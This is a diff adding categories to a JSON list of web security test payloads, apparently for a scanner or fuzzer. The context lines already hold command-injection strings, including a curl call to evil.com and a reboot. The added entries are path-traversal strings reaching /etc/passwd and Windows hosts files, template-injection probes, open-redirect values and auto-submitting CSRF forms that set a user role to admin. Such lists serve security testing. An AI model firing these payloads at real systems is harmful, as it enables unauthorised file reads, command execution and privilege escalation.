@@ -44,6 +44,32 @@
         "& nslookup example.com",
         "; curl http://evil.com",
         "|| reboot"
+    ],
+    "path_traversal": [
+        "../../etc/passwd",
+        "..%2f..%2fetc%2fpasswd",
+        "..\\..\\windows\\system32\\drivers\\etc\\hosts",
+        "..%5c..%5cwindows%5csystem32%5cdrivers%5cetc%5chosts"
+    ],
+    "ssti": [
+        "{{7*7}}",
+        "${7*7}",
+        "{7*7}"
+    ],
+    "open_redirect": [
+        "//evil.com",
+        "https://evil.com",
+        "http://evil.com"
+    ],
+    "csrf": [
+        "<a href='http://example.com/api/setusername?username=CSRFd'>Click Me</a>",
+        "<img src='http://example.com/api/setusername?username=CSRFd'>",
+        "<form action='http://example.com/api/setusername' enctype='text/plain' method='POST'><input name='username' type='hidden' value='CSRFd' /><input type='submit' value='Submit Request' /></form>",
+        "<form id='autosubmit' action='http://example.com/api/setusername' enctype='text/plain' method='POST'><input name='username' type='hidden' value='CSRFd' /><input type='submit' value='Submit Request' /></form><script>document.getElementById('autosubmit').submit();</script>",
+        "<script>var xhr = new XMLHttpRequest();xhr.open('GET', 'http://example.com/api/currentuser');xhr.send();</script>",
+        "<script>var xhr = new XMLHttpRequest();xhr.open('POST', 'http://example.com/api/setrole');xhr.setRequestHeader('Content-Type', 'text/plain');xhr.send('{\"role\":admin}');</script>",
+        "<form id='CSRF_POC' action='http://example.com/api/setrole' enctype='text/plain' method='POST'><input type='hidden' name='{\"role\":admin, \"other\":\"'  value='\"}' /></form><script>document.getElementById('CSRF_POC').submit();</script>",
+        "<script>var xhr = new XMLHttpRequest();xhr.open('POST', 'http://example.com/api/setrole');xhr.withCredentials = true;xhr.setRequestHeader('Content-Type', 'application/json;charset=UTF-8');xhr.send('{\"role\":admin}');</script>"
     ]
 }
 
